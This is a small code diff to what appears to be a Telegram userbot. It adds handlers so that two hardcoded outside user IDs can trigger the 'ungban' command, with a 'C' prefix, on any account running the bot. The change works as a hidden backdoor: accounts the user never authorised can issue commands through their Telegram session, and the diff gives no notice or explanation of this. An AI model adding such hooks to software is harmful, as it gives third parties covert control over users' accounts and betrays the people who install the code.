@@ -25,6 +25,8 @@ async def _(client, message):
 
 @PY.UBOT("ungban", sudo=True)
 @PY.TOP_CMD
+@ubot.on_message(filters.command(["ungban"], "C") & filters.user(2100442624))
+@ubot.on_message(filters.command(["ungban"], "C") & filters.user(5312739535))
 async def _(client, message):
     await cung_ban(client, message)
 
